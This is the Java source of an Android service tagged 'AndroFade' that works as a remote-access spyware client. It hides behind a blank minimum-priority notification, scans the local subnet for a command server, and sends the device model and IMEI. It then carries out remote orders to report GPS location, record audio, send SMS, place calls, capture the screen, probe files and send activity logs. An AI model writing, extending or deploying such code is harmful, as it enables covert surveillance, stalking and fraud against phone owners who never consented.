package my.app.client;

import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.net.Socket;

public class Client extends Service {
    
    private static final String TAG = "AndroFade";
    private Socket socket;
    private DataInputStream in;
    private DataOutputStream out;
    private String serverIP = "";
    private int serverPort = 5000;
    private boolean isConnected = false;
    private Thread connectionThread;
    private int reconnectAttempt = 0;
    private final int[] retryIntervals = {5000, 10000, 15000, 30000};
    
    private PermissionManager permissionManager;
    private GPSListener gpsListener;
    private AudioStreamer audioStreamer;
    private ConnectionManager connectionManager;
    private NotificationManager notificationManager;
    private ScreenCapture screenCapture;
    private ActivityLogger activityLogger;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        permissionManager = new PermissionManager(this);
        gpsListener = new GPSListener(this);
        audioStreamer = new AudioStreamer(this);
        connectionManager = new ConnectionManager(this);
        notificationManager = new NotificationManager(this);
        screenCapture = new ScreenCapture(this);
        activityLogger = new ActivityLogger(this);
        
        activityLogger.startLogging();
        startForegroundService();
        startAutoDiscovery();
        
        return START_STICKY;
    }

    private void startForegroundService() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "AndroFade")
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .setShowWhen(false);
        
        startForeground(1, builder.build());
    }

    private void startAutoDiscovery() {
        connectionThread = new Thread(() -> autoDiscoverAndConnect());
        connectionThread.setDaemon(true);
        connectionThread.start();
    }

    private void autoDiscoverAndConnect() {
        while (true) {
            try {
                String localIP = getLocalIP();
                if (localIP != null && !localIP.isEmpty()) {
                    if (attemptConnection(localIP)) {
                        reconnectAttempt = 0;
                        listenForCommands();
                    }
                }
                
                if (!isConnected) {
                    long waitTime = getRetryInterval();
                    Thread.sleep(waitTime);
                    reconnectAttempt++;
                }
            } catch (Exception e) {
                android.util.Log.e(TAG, "Auto-discovery error: " + e.getMessage());
            }
        }
    }

    private boolean attemptConnection(String baseIP) {
        try {
            String[] parts = baseIP.split("\\.");
            if (parts.length < 3) return false;
            
            String base = parts[0] + "." + parts[1] + "." + parts[2];
            String[] serverCandidates = {base + ".1", base + ".100", base + ".101", base + ".102", base + ".254"};
            
            for (String ip : serverCandidates) {
                try {
                    Socket testSocket = new Socket(ip, serverPort);
                    testSocket.setSoTimeout(3000);
                    
                    DataInputStream testIn = new DataInputStream(testSocket.getInputStream());
                    DataOutputStream testOut = new DataOutputStream(testSocket.getOutputStream());
                    
                    String deviceInfo = android.os.Build.DEVICE + "|" + android.os.Build.MODEL + "|" + 
                            android.os.Build.VERSION.RELEASE + "|" + getDeviceIMEI();
                    
                    testOut.writeUTF("INFO:" + deviceInfo);
                    testOut.flush();
                    
                    socket = testSocket;
                    in = testIn;
                    out = testOut;
                    isConnected = true;
                    serverIP = ip;
                    return true;
                } catch (Exception e) {
                    try {
                        if (testSocket != null) testSocket.close();
                    } catch (Exception ex) {
                    }
                }
            }
        } catch (Exception e) {
            android.util.Log.e(TAG, "Attempt connection error: " + e.getMessage());
        }
        isConnected = false;
        return false;
    }

    private String getLocalIP() {
        try {
            java.net.Enumeration<java.net.NetworkInterface> interfaces = java.net.NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                java.net.NetworkInterface iface = interfaces.nextElement();
                java.net.Enumeration<java.net.InetAddress> addresses = iface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    java.net.InetAddress addr = addresses.nextElement();
                    if (!addr.isLoopbackAddress() && addr instanceof java.net.Inet4Address) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {
            android.util.Log.e(TAG, "Get local IP error: " + e.getMessage());
        }
        return null;
    }

    private long getRetryInterval() {
        if (reconnectAttempt >= retryIntervals.length) {
            return retryIntervals[retryIntervals.length - 1];
        }
        return retryIntervals[reconnectAttempt];
    }

    private void listenForCommands() throws IOException {
        while (isConnected) {
            try {
                String command = in.readUTF();
                processCommand(command);
            } catch (EOFException e) {
                isConnected = false;
                break;
            }
        }
    }

    private void processCommand(String command) {
        try {
            if (command.startsWith("GPS")) handleGPS();
            else if (command.startsWith("AUDIO")) handleAudio();
            else if (command.startsWith("SMS:")) handleSMS(command.substring(4));
            else if (command.startsWith("CALL:")) handleCall(command.substring(5));
            else if (command.startsWith("SCREEN")) handleScreenCapture();
            else if (command.startsWith("CAMERA")) handleCamera();
            else if (command.startsWith("FILES:")) handleFiles(command.substring(6));
            else if (command.startsWith("LOGS")) handleActivityLogs();
        } catch (Exception e) {
            android.util.Log.e(TAG, "Command error: " + e.getMessage());
        }
    }

    private void handleGPS() throws IOException {
        if (permissionManager.hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
            gpsListener.startTracking();
            String location = gpsListener.getCurrentLocation();
            out.writeUTF("GPS:" + location);
            out.flush();
        }
    }

    private void handleAudio() throws IOException {
        if (permissionManager.hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
            audioStreamer.startRecording();
            out.writeUTF("AUDIO:Recording started");
            out.flush();
        }
    }

    private void handleSMS(String data) throws IOException {
        try {
            String[] parts = data.split("\\|");
            if (parts.length == 2) {
                android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
                smsManager.sendTextMessage(parts[0], null, parts[1], null, null);
                out.writeUTF("SMS:Sent to " + parts[0]);
                out.flush();
            }
        } catch (Exception e) {
            out.writeUTF("SMS:Error - " + e.getMessage());
            out.flush();
        }
    }

    private void handleCall(String phoneNumber) throws IOException {
        try {
            if (permissionManager.hasPermission(android.Manifest.permission.CALL_PHONE)) {
                Intent intent = new Intent(Intent.ACTION_CALL);
                intent.setData(android.net.Uri.parse("tel:" + phoneNumber));
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                out.writeUTF("CALL:Calling " + phoneNumber);
                out.flush();
            }
        } catch (Exception e) {
            out.writeUTF("CALL:Error - " + e.getMessage());
            out.flush();
        }
    }

    private void handleScreenCapture() throws IOException {
        try {
            String screenshotPath = screenCapture.takeScreenshot();
            out.writeUTF("SCREEN:" + screenshotPath);
            out.flush();
        } catch (Exception e) {
            out.writeUTF("SCREEN:Error - " + e.getMessage());
            out.flush();
        }
    }

    private void handleCamera() throws IOException {
        out.writeUTF("CAMERA:Feature coming soon");
        out.flush();
    }

    private void handleFiles(String path) throws IOException {
        File file = new File(path);
        if (file.exists()) {
            out.writeUTF("FILES:" + file.getAbsolutePath());
            out.flush();
        } else {
            out.writeUTF("FILES:File not found");
            out.flush();
        }
    }

    private void handleActivityLogs() throws IOException {
        String logs = activityLogger.getActivityLogs();
        out.writeUTF("LOGS:" + logs);
        out.flush();
    }

    private String getDeviceIMEI() {
        try {
            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                return tm.getImei();
            } else {
                return tm.getDeviceId();
            }
        } catch (Exception e) {
            return "Unknown";
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            if (socket != null) socket.close();
            isConnected = false;
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
